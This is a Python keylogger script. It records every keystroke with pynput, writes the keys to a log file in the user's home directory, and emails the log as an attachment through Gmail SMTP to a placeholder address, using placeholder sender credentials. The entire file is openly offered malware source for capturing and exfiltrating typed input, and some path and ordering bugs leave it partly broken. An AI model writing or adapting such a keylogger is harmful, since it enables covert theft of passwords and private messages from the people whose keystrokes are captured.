import os
from pynput.keyboard import Key, Listener

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

email_address = "your_email_address"
password = "your_password"

key_log = "key_log.txt"

user_home = os.environ.get('HOME')
relative_path = "/IdeaProjects"

file_path = os.path.join(user_home, relative_path)
print(file_path)

count = 0
keys = []

def onPress(key):
    global keys, count
    
    if key == Key.space or key == Key.enter:
        keys.append(' ')
    else:
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []

def writeToFile(keys):
    with open(file_path + key_log, 'a') as f:
        for key in keys:
            k = str(key).replace("'","")
            if key == Key.backspace:
                f.write('!')
            elif key == Key.up:
                f.write(" (up) ")
            elif key == Key.down:
                f.write(" (down) ")
            elif key == Key.right:
                f.write(" (right) ")
            elif key == Key.left:
                f.write(" (left) ")
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.ctrl_l or key == Key.shift or key == Key.tab or key == Key.alt_l:
                f.write("")
            else:
                f.write(key)

def send_email(filename, attachment, toaddr):

    fromaddr = email_address
    filename = filename

    body = "Keylogger"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"

    msg.attach(MIMEText(body, 'plain'))

    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    encoders.encode_base64(p)
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)
    s.quit()

toaddr = "example.com"
send_email(key_log, file_path + key_log, toaddr)

def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()

